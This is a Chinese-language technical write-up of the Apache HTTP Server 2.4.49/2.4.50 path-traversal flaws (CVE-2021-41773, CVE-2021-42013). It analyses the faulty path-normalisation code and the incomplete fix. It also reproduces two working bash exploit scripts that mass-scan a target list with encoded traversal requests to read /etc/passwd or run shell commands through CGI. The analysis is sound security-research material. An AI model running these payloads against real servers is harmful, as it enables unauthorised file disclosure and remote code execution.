### 漏洞说明

> 在Apache HTTP Server 2.4.49
> 中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击穿越到服务器目录以外。在开启CGI配置后(开启cgi并不是什么罕见之事)，将会从目录穿越升级为RCE。

### 漏洞影响

Apache HTTP Server 2.4.49

Apache HTTP Server 2.4.50 （修复不完整 CVE-2021-42013）

### 漏洞成因

  1. 由于在Apache HTTP Server 2.4.48 升级到 Apache HTTP Server 2.4.49 时，对路径规范化所做的更改中出现漏洞，该漏洞是由于 _**server/util.c**_ 中的 _**ap_normalize_path**_ 函数 一次解析一个 Unicode 值并在所有字符都被解码之前尝试检测遍历逻辑导致的。

  2. 该漏洞默认配置情况下只存在目录遍历，但开启不受限制的 _**mod_cgi**_ 功能将会造成RCE

### 漏洞代码块

存在漏洞的代码块

    
    
    # server/util.c 第 561 – 596 行
    
    if (path[l] == '.') {
        /* Remove /./ segments */
        if (IS_SLASH_OR_NUL(path[l + 1])) {
            l++;
            if (path[l]) {
                l++;
            }
            continue;
        }
    
        /* Remove /xx/../ segments */
        if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
            /* Wind w back to remove the previous segment */
            if (w > 1) {
                do {
                    w--;
                } while (w && !IS_SLASH(path[w - 1]));
            }
            else {
                /* Already at root, ignore and return a failure
                 * if asked to.
                 */
                if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) {
                    ret = 0;
                }
            }
    
            /* Move l forward to the next segment */
            l += 2;
            if (path[l]) {
                l++;
            }
            continue;
        }
    }
    

与上一个代码块做对比

![image.png](https://image.3001.net/images/20211215/1639502623_61b8d31f6116e945cdef2.png!small)

完整内容

    
    
    AP_DECLARE(int) ap_normalize_path(char *path, unsigned int flags)
    {
        int ret = 1;
        apr_size_t l = 1, w = 1;
    
        if (!IS_SLASH(path[0])) {
            /* Besides "OPTIONS *", a request-target should start with '/'
             * per RFC 7230 section 5.3, so anything else is invalid.
             */
            if (path[0] == '*' && path[1] == '\0') {
                return 1;
            }
            /* However, AP_NORMALIZE_ALLOW_RELATIVE can be used to bypass
             * this restriction (e.g. for subrequest file lookups).
             */
            if (!(flags & AP_NORMALIZE_ALLOW_RELATIVE) || path[0] == '\0') {
                return 0;
            }
    
            l = w = 0;
        }
    
        while (path[l] != '\0') {
            /* RFC-3986 section 2.3:
             *  For consistency, percent-encoded octets in the ranges of
             *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),
             *  period (%2E), underscore (%5F), or tilde (%7E) should [...]
             *  be decoded to their corresponding unreserved characters by
             *  URI normalizers.
             */
            if ((flags & AP_NORMALIZE_DECODE_UNRESERVED)
                    && path[l] == '%' && apr_isxdigit(path[l + 1])
                                      && apr_isxdigit(path[l + 2])) {
                const char c = x2c(&path[l + 1]);
                if (apr_isalnum(c) || (c && strchr("-._~", c))) {
                    /* Replace last char and fall through as the current
                     * read position */
                    l += 2;
                    path[l] = c;
                }
            }
    
            if ((flags & AP_NORMALIZE_DROP_PARAMETERS) && path[l] == ';') {
                do {
                    l++;
                } while (!IS_SLASH_OR_NUL(path[l]));
                continue;
            }
    
            if (w == 0 || IS_SLASH(path[w - 1])) {
                /* Collapse ///// sequences to / */
                if ((flags & AP_NORMALIZE_MERGE_SLASHES) && IS_SLASH(path[l])) {
                    do {
                        l++;
                    } while (IS_SLASH(path[l]));
                    continue;
                }
    
    
                if (path[l] == '.') {
                    /* Remove /./ segments */
                    if (IS_SLASH_OR_NUL(path[l + 1])) {
                        l++;
                        if (path[l]) {
                            l++;
                        }
                        continue;
                    }
    
                    /* Remove /xx/../ segments */
                    if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) {
                        /* Wind w back to remove the previous segment */
                        if (w > 1) {
                            do {
                                w--;
                            } while (w && !IS_SLASH(path[w - 1]));
                        }
                        else {
                            /* Already at root, ignore and return a failure
                             * if asked to.
                             */
                            if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) {
                                ret = 0;
                            }
                        }
    
                        /* Move l forward to the next segment */
                        l += 2;
                        if (path[l]) {
                            l++;
                        }
                        continue;
                    }
                }
            }
    
            path[w++] = path[l++];
        }
        path[w] = '\0';
    
        return ret;
    }
    

### 分析

当攻击者在 URL 中使用 _**/.%2e/**_ 时，第 572 行的逻辑不会将 _**%2e**_
识别为句号，此时该字符尚未被解码。但该版本Apache HTTP Servers并没有在这种情况下将整体URL进行解码并匹配目录穿越过滤，导致
**/.%2e/**被 直接代入传递，导致目录穿越，具体如下

    
    
    /* Remove /xx/../ segments */
                    if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2]))
    #上面的代码错误判断了目录穿越的payload，&& 判断只有在目录.的后面跟的是/或者空的时候才会触发次规则，并且没有解URL编码的%2e传入后并不会对%2e解码进行回溯验证，也不会对整体URL进行解码匹配，而是只识别了%,2,e
    
    
    #define IS_SLASH(s) (s == '/')
    #define IS_SLASH_OR_NUL(s) (s == '\0' || IS_SLASH(s))
    

然而该漏洞并不是所有情况下都能够RCE:

导致该漏洞从 目录穿越 / 敏感文件泄露 升级到RCE的关键是 _**开启了cgi配置**_

至于什么是CGI，互联网上的教程很多，这里就不在赘述

在一些CGI配置文件限制扩展名不全的情况下，在 **/cgi-bin/**目录下执行的所有文件都会被当作cgi脚本程序执行

所以出现了以下poc：

    
    
    # Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal
    # Date: 10/05/2021
    # Exploit Author: Lucas Souza https://lsass.io
    # Vendor Homepage:  https://apache.org/
    # Version: 2.4.49
    # Tested on: 2.4.49
    # CVE : CVE-2021-41773
    # Credits: Ash Daulton and the cPanel Security Team
    
    #!/bin/bash
    
    if [[ $1 =3D=3D '' ]]; [[ $2 =3D=3D '' ]]; then
    echo Set [TAGET-LIST.TXT] [PATH]
    echo ./PoC.sh targets.txt /etc/passwd
    exit
    fi
    for host in $(cat $1); do
    curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"; done
    
    # PoC.sh targets.txt /etc/passwd
    # PoC.sh targets.txt /bin/sh whoami
    

### 后续

在2.4.49 -> 2.4.50版本中代码变更内容如下:

![image.png](https://image.3001.net/images/20211215/1639502645_61b8d33584c1c162c0825.png!small)

发现多了一个关键字 **decode_unreserved** ，找一下，发现了533-541行

该处代码检查了以%开头，后两位解码后为 **-._~**字符的内容，但依旧没有对整体内容进行检查，也没有防止二次编码

    
    
    if (decode_unreserved
                    && path[l] == '%' && apr_isxdigit(path[l + 1])
                                      && apr_isxdigit(path[l + 2])) {
                const char c = x2c(&path[l + 1]);
                if (apr_isalnum(c) || (c && strchr("-._~", c))) {
                    /* Replace last char and fall through as the current
                     * read position */
                    l += 2;
                    path[l] = c;
    

可以看到，在该版本的代码特别的针对了%2e

    
    
    /* Remove /xx/../ segments (or /xx/.%2e/ when
                     * AP_NORMALIZE_DECODE_UNRESERVED is set since we
                     * decoded only the first dot above).
                     */
                    n = l + 1;
                    if ((path[n] == '.' || (decode_unreserved
                                            && path[n] == '%'
                                            && path[++n] == '2'
                                            && (path[++n] == 'e'
                                                || path[n] == 'E')))
                        && IS_SLASH_OR_NUL(path[n + 1])) {
                        /* Wind w back to remove the previous segment */
    

但是他们好像忘记了URL双重编码...

所以POC(CVE-2021-42013):

    
    
    # Exploit: Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)
    # Date: 10/05/2021
    # Exploit Author: Lucas Souza https://lsass.io
    # Vendor Homepage:  https://apache.org/
    # Version: 2.4.50
    # Tested on: 2.4.50
    # CVE : CVE-2021-42013
    # Credits: Ash Daulton and the cPanel Security Team
    
    #!/bin/bash
    
    if [[ $1 == '' ]]; [[ $2 == '' ]]; then
    echo Set [TAGET-LIST.TXT] [PATH] [COMMAND]
    echo ./PoC.sh targets.txt /etc/passwd
    echo ./PoC.sh targets.txt /bin/sh id
    
    exit
    fi
    for host in $(cat $1); do
    echo $host
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"; done
    
    # PoC.sh targets.txt /etc/passwd
    # PoC.sh targets.txt /bin/sh whoami
    

在2.4.50 -> 2.4.51版本中代码变更内容如下:

![image.png](https://image.3001.net/images/20211215/1639502656_61b8d34047a604dac8950.png!small)

成功修复了漏洞

### 附录

[Apache Http Server 历史版本归档](https://archive.apache.org/dist/httpd/)

